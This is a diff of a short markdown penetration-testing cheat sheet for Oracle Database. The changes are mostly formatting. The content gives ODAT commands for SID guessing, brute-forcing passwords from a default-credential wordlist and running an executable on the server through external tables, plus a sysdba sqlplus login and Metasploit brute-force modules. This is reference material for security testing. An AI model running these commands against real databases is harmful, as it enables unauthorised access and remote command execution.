@@ -1,11 +1,13 @@
 # Oracle
 
 > Oracle Database is a multi-model database management system produced and marketed by Oracle Corporation. It is a database commonly used for running online transaction processing, data warehousing and mixed database workloads.   
-
+>
+> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Oracle_Database)</cite>
 
 ## General 
 
 `sysdba` is like sudo
+
 
 ## ODAT
 
@@ -20,10 +22,10 @@ odat.py sidguesser -s <ip> -p <port>
 
 ### Guess password (using sid)
 
-```
+```bash
 /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
 ```
--> replace ` ` by `/`
+-> Replace ` ` by `/`
 
 ```bash
 odat.py passwordguesser -d <sid> --accounts-file <file> -s <ip>
@@ -36,22 +38,27 @@ odat.py passwordguesser -d <sid> --accounts-file <file> -s <ip>
 ```
 
 ### Read files or execute system commands/scripts
-
 ```bash
 ./odat.py externaltable -s <ip> --sysdba -d XE -U <user> -P <password> --exec /temp shell.exe
 ```
 
 ## SQL Plus
+
 > **SQL Plus** is the most basic  [Oracle Database](https://en.wikipedia.org/wiki/Oracle_Database)  utility, with a basic  [command-line interface](https://en.wikipedia.org/wiki/Command-line_interface) , commonly used by users, administrators, and programmers.  
 
 ```bash
 sqlplus <user>/<pass>@<ip>:<port>/<sid> as sysdba
 ```
 
-## Metasploit modules
+## Metasploit
 
-* `admin/oracle/sid_brute` 
-* `admin/oracle/oracle_login`
+```bash
+admin/oracle/sid_brute
+```
+
+```bash
+admin/oracle/oracle_login
+```
 
 ## File operations
 
@@ -69,13 +76,13 @@ begin
 end;
 ```
 
-enable display of output
-```
+Enable display of output
+```bash
 set serveroutput ON
 ```
 
-execute it
-```
+Execute it
+```bash
 /
 ```
 
@@ -93,14 +100,14 @@ begin
 end;
 ```
 
-execute it 
-```
+Execute it 
+```bash
 /
 ```
 
 ## Check privileges
 
-```sql
-select * from session_privs
+```bash
+select * from session_privs;
 select * from user_role_privs;
 ```
